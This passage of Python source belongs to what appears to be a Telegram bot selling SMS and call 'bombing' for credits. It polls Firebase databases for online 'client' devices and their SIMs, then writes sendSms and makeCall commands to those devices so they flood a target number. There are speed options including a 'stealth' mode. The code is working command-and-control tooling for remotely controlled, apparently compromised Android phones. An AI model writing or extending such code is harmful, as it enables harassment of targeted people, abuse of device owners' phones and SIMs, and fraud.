    log.info("Background JSON Backup Task STARTED")
    while True:
        try:
            d = load()
            cfg = d.get("backup", DEFAULT_BACKUP)
            interval_sec = max(5, int(cfg.get("interval_minutes", 60))) * 60
            enabled = cfg.get("enabled", True)
            last = int(cfg.get("last_backup_ts", 0))
            now = int(time.time())

            if enabled and (now - last) >= interval_sec:
                await do_backup_send(bot, d, reason="auto")
            # sleep in smaller chunks so interval changes take effect sooner
            await asyncio.sleep(min(60, interval_sec // 4 or 30))
        except asyncio.CancelledError:
            log.info("[BG-BACKUP] Task cancelled — shutting down cleanly")
            return
        except Exception as e:
            log.error(f"Backup loop error: {e}")
            await asyncio.sleep(60)

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'blast_data']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.blast_data = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    add_media_spoiler_confirm = State()
    # new states
    backup_set_chat = State()
    backup_set_interval = State()
    backup_import_file = State()
    add_firebase_active = State()
    add_firebase_active_file = State()
    extract_active_text = State()
    extract_active_file = State()
    bomb_number = State()
    bomb_message = State()
    bomb_speed = State()
    bomb_count = State()
    api_test_number = State()
    set_mode_cost = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "backup": DEFAULT_BACKUP.copy(),
        "bomb_stats": {"sms_sent": 0, "sms_failed": 0, "wa_sent": 0, "wa_failed": 0, "call_sent": 0, "call_failed": 0},
        "api_usage_detail": {},
        "api_health": {},
        "api_enabled": {},
        "extracted_firebases": [],
        "daily_bomb_count": {},
        "mode_costs": DEFAULT_MODE_COSTS.copy(),
    }

def load() -> dict:
    with _DB_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                default = _default_data()
                for k, v in default.items():
                    if k not in data:
                        data[k] = v
                if MAIN_OWNER not in data.get("owners", []):
                    data["owners"].insert(0, MAIN_OWNER)
                for uid_str, u in data.get("users", {}).items():
                    if "credits" not in u:
                        u["credits"] = 0
                    if "sms_history" not in u:
                        u["sms_history"] = []
                    if "manual_added_credits" not in u:
                        u["manual_added_credits"] = 0
                if "backup" not in data:
                    data["backup"] = DEFAULT_BACKUP.copy()
                global PROTECTED_NUMBERS
                PROTECTED_NUMBERS = data.get("protected_numbers", {})
                return data
            except Exception as e:
                log.error(f"Load error: {e}")
        d = _default_data()
        save(d)
        return d

def save(d: dict):
    with _DB_LOCK:
        d["protected_numbers"] = PROTECTED_NUMBERS
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)

def atomic_update(mutate_fn):
    with _DB_LOCK:
        if os.path.exists(_DATA_FILE):
            try:
                with open(_DATA_FILE, "r", encoding="utf-8") as f:
                    d = json.load(f)
            except Exception as e:
                log.error(f"atomic_update load error: {e}")
                d = _default_data()
        else:
            d = _default_data()

        default = _default_data()
        for k, v in default.items():
            if k not in d:
                d[k] = v
        if MAIN_OWNER not in d.get("owners", []):
            d["owners"].insert(0, MAIN_OWNER)
        for uid_str, u in d.get("users", {}).items():
            if "credits" not in u:
                u["credits"] = 0
            if "sms_history" not in u:
                u["sms_history"] = []
            if "manual_added_credits" not in u:
                u["manual_added_credits"] = 0
        if "backup" not in d:
            d["backup"] = DEFAULT_BACKUP.copy()

        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d.get("protected_numbers", {})

        result = mutate_fn(d)

        d["protected_numbers"] = PROTECTED_NUMBERS
        with open(_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)

        return result

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "manual_added_credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict, is_manual: bool = False):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0, "manual_added_credits": 0}
    if "manual_added_credits" not in d["users"][k]:
        d["users"][k]["manual_added_credits"] = 0
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount
    if is_manual:
        d["users"][k]["manual_added_credits"] += amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d, is_manual=False)
    add_credits(referrer_uid, ref_credits, d, is_manual=False)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍE! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        return
    media_item = random.choice(videos)

    if isinstance(media_item, dict):
        media_type = media_item.get("type", "video")
        file_id    = media_item.get("file_id")
        spoiler    = bool(media_item.get("spoiler", False))
    else:
        media_type = "video"
        file_id    = media_item
        spoiler    = False

    if not file_id:
        return

    try:
        if media_type == "photo":
            await bot.send_photo(chat_id, photo=file_id, caption=q(caption) if caption else None, parse_mode="HTML", has_spoiler=spoiler)
        else:
            await bot.send_video(chat_id, video=file_id, caption=q(caption) if caption else None, parse_mode="HTML", has_spoiler=spoiler)
    except Exception as e:
        log.error(f"Failed to send random media: {e}")

async def send_media_with_caption(bot: Bot, chat_id: int, d: dict, text: str, markup):
    """Welcome / home: random media + quoted text as caption. Different user = different media."""
    videos = d.get("videos", [])
    body = q(text)
    visible_len = len(re.sub(r"<[^>]+>", "", body))
    if videos and visible_len <= 1000:
        item = random.choice(videos)
        if isinstance(item, dict):
            mtype = item.get("type", "video")
            fid = item.get("file_id")
            spoiler = bool(item.get("spoiler", False))
        else:
            mtype, fid, spoiler = "video", item, False
        try:
            if mtype == "photo":
                await bot.send_photo(chat_id, photo=fid, caption=body, parse_mode="HTML",
                                     reply_markup=markup, has_spoiler=spoiler)
            else:
                await bot.send_video(chat_id, video=fid, caption=body, parse_mode="HTML",
                                     reply_markup=markup, has_spoiler=spoiler)
            return
        except Exception as e:
            log.error(f"Combined media send failed: {e}")
    await bot.send_message(chat_id, body, reply_markup=markup, parse_mode="HTML")

async def safe_edit(message, text, reply_markup=None, parse_mode="HTML", **kwargs):
    body = q(text) if text and not (text.strip().startswith("<blockquote>") and text.strip().endswith("</blockquote>")) else text
    try:
        return await message.edit_text(body, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)
    except TelegramBadRequest:
        kwargs.pop("disable_web_page_preview", None)
        try:
            return await message.edit_caption(caption=body, reply_markup=reply_markup, parse_mode=parse_mode, **kwargs)
        except TelegramBadRequest:
            return None

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🚀 FAST  — ᴍᴀx ᴘᴏᴡᴇʀ", f"{prefix}:speed:fast",   EMOJI_ROCKET, "🚀", style="danger")],
        [btn("⚡ MEDIUM — ʙᴀʟᴀɴᴄᴇᴅ",   f"{prefix}:speed:medium", EMOJI_STAR,   "⚡", style="primary")],
        [btn("🐢 SLOW   — sᴛᴇᴀʟᴛʜ",    f"{prefix}:speed:slow",   EMOJI_PHONE,  "🐢", style="success")],
        [btn("❌ Cᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    """Ultra animated-style progress bar with gradient blocks."""
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    pct_val = int(current * 100 / total) if total > 0 else 0
    # gradient: full → partial → empty
    if filled == 0:
        bar = "░" * width
    elif filled == width:
        bar = "█" * width
    else:
        bar = "█" * (filled - 1) + "▓" + "░" * (width - filled)
    return bar

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    done  = sent + failed
    pct_v = int((done / total) * 100) if total > 0 else 0
    bar   = progress_bar(done, total, 18)
    success_rate = int((sent / done) * 100) if done > 0 else 100
    # speed icon
    spd_icon = "🚀" if "FAST" in speed_label.upper() else ("🐢" if "SLOW" in speed_label.upper() else "⚡")
    lines = [
        f"<b>💣 SMS ʙʟᴀsᴛ — ʟɪᴠᴇ</b>",
        f"{SEP_THIN}",
        f"<code>{bar}</code> <b>{pct_v}%</b>",
        f"{SEP_DOT}",
        f"✅  sᴇɴᴛ      <b>{glow_num(sent)}</b>",
        f"❌  ғᴀɪʟᴇᴅ    <b>{glow_num(failed)}</b>",
        f"📊  ᴘʀᴏɢʀᴇss  <b>{done}</b> / <b>{total}</b>",
        f"🎯  ʀᴀᴛᴇ      <b>{success_rate}%</b> sᴜᴄᴄᴇss",
        f"{spd_icon}  sᴘᴇᴇᴅ     <b>{speed_label}</b>",
    ]
    if credits is not None:
        lines.append(f"💳  ᴄʀᴇᴅɪᴛs  <b>{credits}</b> ʟᴇғᴛ")
    lines.append(f"{SEP_THIN}")
    lines.append(f"<i>🛑 sᴛᴏᴘ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ɴɪᴄʜᴇ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🛑 STOP SENDING NOW", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")],
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS

    if SCANNING_IN_PROGRESS:
        return f"⏳ Sᴄᴀɴɴɪɴɢ ꜰɪʀᴇʙᴀsᴇ..."

    if not CACHED_DEVICES:
        return f"🔴 Nᴏ ᴅᴇᴠɪᴄᴇs ꜰᴏᴜɴᴅ"

    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME

    if time_diff < 60:
        return f"🟢 {device_count} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ"
    elif time_diff < 300:
        return f"🟡 {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴀɢᴏ)"
    else:
        return f"🔴 {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff/60)}ᴍ ᴀɢᴏ — sᴛᴀʟᴇ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            CACHED_DEVICES = devices

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                current_fb_ids = {fb["id"] for fb in fbs}
                stale_fb_ids = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
                for stale in stale_fb_ids:
                    FB_DEVICE_COUNTS.pop(stale, None)

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            q(
                                f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                                f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                                f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                                f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                                f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                                f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>"
                            ),
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except asyncio.CancelledError:
            log.info("[BG-SCAN] Task cancelled — shutting down cleanly")
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            return
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300:
                        return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.15 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def probe_firebase_alive(url: str, timeout: float = 8.0) -> bool:
    """Return True if Firebase responds with a non-null clients shallow object."""
    probe = url.rstrip("/") + "/clients.json?shallow=true"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(probe, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                if r.status != 200:
                    return False
                txt = (await r.text()).strip()
                if not txt or txt == "null":
                    return False
                data = json.loads(txt)
                return isinstance(data, dict)
    except Exception:
        return False

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt:
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2:
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": name,
                                                "sims": sims,
                                            }
                        except Exception as e:
                            log.warning(f"Device fetch {dev_id}: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res:
                                results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def make_call_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/makeCall.json",
        {
            "to": to.strip(),
            "from": sim_slot,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"⛔ <b>ACCESS LOCKED</b>",
        f"{SEP_THICK}",
        f"Bot use karne se pehle join karo 👇",
        f"{SEP_DOT}",
    ]
    for i, ch in enumerate(missing, 1):
        lines.append(f"{i}. 🔔 <a href=\'{ch['link']}\'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"{SEP_DOT}")
    lines.append(f"<i>✅ Join ke baad Refresh button dabao</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    backup = d.get("backup", DEFAULT_BACKUP)
    b_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if backup.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    b_int = backup.get("interval_minutes", 60)

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    total_s = stats.get('total_sent', 0)
    total_f = stats.get('total_failed', 0)
    total_ops = total_s + total_f
    srate = f"{int(total_s*100/total_ops)}%" if total_ops > 0 else "—"
    return (
        f"👑 <b>OWNER PANEL</b> — {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n"
        f"{SEP_THICK}\n"
        f"🔥  ꜰɪʀᴇʙᴀsᴇ  <b>{len(fbs)}</b>  │  👑 ᴏᴡɴᴇʀs  <b>{len(owners)}</b>/6\n"
        f"🛡   ᴀᴅᴍɪɴs   <b>{len(admins)}</b>  │  👥 ᴜsᴇʀs   <b>{glow_num(len(users))}</b>\n"
        f"📹  ᴍᴇᴅɪᴀ    <b>{len(videos)}</b>\n"
        f"{SEP_DOT}\n"
        f"📤  sᴇɴᴛ     <b>{glow_num(total_s)}</b>  │  ❌ ꜰᴀɪʟ  <b>{glow_num(total_f)}</b>\n"
        f"🎯  sᴜᴄᴄᴇss  <b>{srate}</b>  │  🚀 ᴀᴄᴛɪᴠᴇ <b>{active_sessions}</b>\n"
        f"{SEP_DOT}\n"
        f"🔓  ᴀᴄᴄᴇss    {mode}\n"
        f"📢  ꜰ.ᴊᴏɪɴ    {fj_status}  │  💳 ᴘʟᴀɴs <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"🔒  ᴘʀᴏᴛᴇᴄᴛ  <b>{protected_count}</b>  │  📦 ʙᴀᴄᴋᴜᴘ {b_status}/{b_int}ᴍ\n"
        f"{SEP_DOT}\n"
        f"<b>📡 ꜰɪʀᴇʙᴀsᴇ sᴛᴀᴛᴜs:</b>\n{fb_summary}\n"
        f"🔄  sᴄᴀɴɴᴇʀ   {scan_info}\n"
        f"{SEP_THICK}"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
